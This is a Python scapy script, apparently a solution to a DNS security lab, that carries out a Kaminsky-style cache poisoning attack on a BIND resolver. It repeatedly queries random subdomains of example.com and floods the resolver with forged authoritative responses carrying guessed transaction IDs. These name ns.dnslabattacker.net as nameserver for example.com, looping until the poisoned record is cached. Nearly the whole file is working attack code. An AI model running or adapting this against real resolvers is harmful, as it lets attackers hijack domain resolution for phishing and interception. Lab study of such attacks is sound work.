#!/usr/bin/env python2
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

def modify(packet):
    packet["DNS"].aa = 1
    packet["DNS"].nscount = 1
    packet["DNS"].ns.rrname = "example.com"
    packet["DNS"].ns.rdata = "ns.dnslabattacker.net"
    packet["DNS"].qr = 1
    return packet

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = scapy.all.DNS(rd=1, qd=scapy.all.DNSQR(qname='example.com'))
    sendPacket(sock, bytes(dnsPacket), my_ip, my_port)
    response = sock.recv(4096)
    response = scapy.all.DNS(response)
    attack_packet = modify(response)
    check_ns = ""
    while "ns.dnslabattacker.net" not in check_ns:
        random_subdomain = getRandomSubDomain()
        dnsPacket.qd.qname = random_subdomain + ".example.com"
        attack_packet.qd.qname = random_subdomain + ".example.com"
        attack_packet.an.rrname = random_subdomain + ".example.com"
        sendPacket(sock, dnsPacket, my_ip, my_port)
        for i in range(100):
            attack_packet.id = getRandomTXID()
            sendPacket(sock, attack_packet, my_ip, my_query_port)
        response = sock.recv(4096)
        response = scapy.all.DNS(response)
        if response["DNS"].nscount:
            check_ns = response["DNS"].ns.rdata
        else:
            check_ns = "nah"
    # print "\n***** Packet Received from Remote Server *****"
    print(check_ns)
    # print "***** End of Remote Server Packet *****\n"

if __name__ == '__main__':
    exampleSendDNSQuery()
